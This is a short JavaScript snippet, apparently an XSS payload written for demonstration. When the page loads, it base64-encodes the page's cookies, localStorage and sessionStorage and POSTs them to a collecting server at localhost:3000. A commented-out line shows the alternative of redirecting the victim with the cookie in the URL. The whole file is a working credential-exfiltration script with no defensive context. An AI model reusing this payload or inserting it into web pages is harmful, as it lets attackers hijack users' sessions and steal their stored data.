document.addEventListener('DOMContentLoaded', function() {
  const ajax = new XMLHttpRequest();
  const urlParams = new URLSearchParams({
    cookie: btoa(document.cookie),
    localStorage: btoa(JSON.stringify(Object.entries(localStorage))),
    sessionStorage: btoa(JSON.stringify(Object.entries(sessionStorage)))
  });

  ajax.open('POST', `http://localhost:3000?${urlParams}`);
  // ajax.setRequestHeader('Access-Control-Allow-Origin', '*');
  ajax.send();

  // or we can just redirect the user with the given data
  // window.location = `http://localhost:3000?cookie=${btoa(document.cookie)}`;
});
